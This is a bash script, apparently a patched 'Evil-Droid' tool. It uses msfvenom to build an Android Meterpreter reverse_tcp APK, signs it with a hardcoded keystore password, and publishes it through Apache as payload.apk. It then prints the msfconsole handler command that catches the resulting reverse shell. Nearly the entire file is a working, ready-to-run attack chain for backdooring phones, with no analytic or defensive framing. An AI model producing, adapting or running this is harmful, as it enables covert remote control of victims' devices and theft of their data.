#!/bin/bash
# Evil-Droid Fixed Version

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

LHOST="192.168.1.68"
LPORT="4444"
PAYLOAD="android/meterpreter/reverse_tcp"
APK_NAME="evilapk.apk"
WORK_DIR="/mnt/0fc69e98-7c6f-4598-9c22-19a0b4458142/hamedpro/hack/Evil-Droid/evilapk"

echo -e "${GREEN}[+] Evil-Droid Fixed Payload Generator${NC}"
echo -e "${YELLOW}[*] LHOST: $LHOST${NC}"
echo -e "${YELLOW}[*] LPORT: $LPORT${NC}"
echo -e "${YELLOW}[*] Payload: $PAYLOAD${NC}"

# Create working directory
mkdir -p $WORK_DIR

# Generate payload (FIXED - removed incorrect 'R' parameter)
echo -e "${YELLOW}[*] Generating APK payload...${NC}"
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android -o $WORK_DIR/$APK_NAME

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[✔] Payload generated successfully!${NC}"
else
    echo -e "${RED}[✘] Failed to generate payload${NC}"
    exit 1
fi

# Sign the APK
echo -e "${YELLOW}[*] Signing APK...${NC}"
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/my-release-key.keystore -storepass password123 $WORK_DIR/$APK_NAME myalias

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[✔] APK signed successfully!${NC}"
else
    echo -e "${RED}[✘] Failed to sign APK${NC}"
    exit 1
fi

# Verify
echo -e "${YELLOW}[*] Verifying APK...${NC}"
jarsigner -verify $WORK_DIR/$APK_NAME

# Copy to web directory
cp $WORK_DIR/$APK_NAME /var/www/html/payload.apk

# Start Apache
systemctl start apache2

echo ""
echo -e "${GREEN}=========================================${NC}"
echo -e "${GREEN}[✔] APK Ready!${NC}"
echo -e "${GREEN}[✔] Location: $WORK_DIR/$APK_NAME${NC}"
echo -e "${GREEN}[✔] Download: http://$LHOST/payload.apk${NC}"
echo -e "${GREEN}[✔] Size: $(du -h $WORK_DIR/$APK_NAME | cut -f1)${NC}"
echo ""
echo -e "${YELLOW}[*] Start listener with:${NC}"
echo "msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit'"
echo -e "${GREEN}=========================================${NC}"
